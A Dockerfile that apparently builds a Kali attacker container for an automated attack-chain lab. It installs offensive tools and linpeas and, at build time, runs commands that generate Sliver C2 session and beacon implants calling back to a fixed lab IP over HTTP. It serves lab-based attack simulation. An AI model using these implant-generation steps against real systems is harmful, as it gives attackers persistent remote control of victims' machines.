FROM kalilinux/kali-rolling

RUN echo 'deb http://kali.download/kali kali-rolling main contrib non-free non-free-firmware' \
    > /etc/apt/sources.list \
    && printf 'Acquire::Retries "5";\nAcquire::http::Timeout "30";\n' \
    > /etc/apt/apt.conf.d/80-retries \
    && apt-get update \
    && apt-get install -y --no-install-recommends \
    nmap \
    gobuster \
    ffuf \
    nikto \
    dirb \
    wordlists \
    dnsutils \
    wget \
    curl \
    ca-certificates \
    openssh-client \
    sshpass \
    iproute2 \
    iputils-ping \
    python3 \
    python3-requests \
    python3-rich \
    python3-psycopg2 \
    sliver \
    netexec \
    git \
    && ln -s /usr/share/dirb/wordlists /usr/share/wordlists/dirb \
    && rm -rf /var/lib/apt/lists/*

COPY linpeas.sh /opt/linpeas.sh
RUN chmod +x /opt/linpeas.sh

# ---------------------------------------------------------------------------
# Bake the Sliver implants at image-build time so tools/run.sh --mode advanced
# doesn't pay the ~3-minute cold-compile cost (Go modules + garble obfuscation)
# on the first run after every `docker compose down`. Both implants target the
# lab's fixed kali IP (10.10.0.2:8080, set by docker-compose IPAM), so the
# baked artefacts work for every chain run without any per-run regeneration.
#
# Drops session_implant + beacon_implant at /tmp/, exactly where
# advanced_initial_access.py:ensure_beacon_compiled() looks for them. That
# function's existence check (`if not os.path.exists(...)`) makes it a no-op
# whenever the baked files are present; the 300 s runtime timeout it carries
# is a safety net in case this layer is ever rebuilt without a Sliver server.
# ---------------------------------------------------------------------------
RUN set -eux; \
    sliver-server daemon >/tmp/sliver-build.log 2>&1 & SLIVER_PID=$!; \
    for _i in $(seq 1 30); do ss -tlnp 2>/dev/null | grep -q ':31337' && break; sleep 2; done; \
    sliver-server operator --name admin --lhost 127.0.0.1 --permissions all \
        --save /tmp/admin.cfg; \
    sliver-client import /tmp/admin.cfg; \
    printf 'generate --http 10.10.0.2:8080 --os linux --arch amd64 \
--save /tmp/session_implant\nexit\n' > /tmp/gen-session.rc; \
    sliver-client --rc /tmp/gen-session.rc; \
    printf 'generate beacon --http 10.10.0.2:8080 --seconds 5 --os linux \
--arch amd64 --save /tmp/beacon_implant\nexit\n' > /tmp/gen-beacon.rc; \
    sliver-client --rc /tmp/gen-beacon.rc; \
    kill "$SLIVER_PID" 2>/dev/null || true; \
    sleep 2; \
    test -s /tmp/session_implant; \
    test -s /tmp/beacon_implant; \
    rm -f /tmp/admin.cfg /tmp/gen-session.rc /tmp/gen-beacon.rc /tmp/sliver-build.log

WORKDIR /Attack-chain

CMD ["sleep", "infinity"]
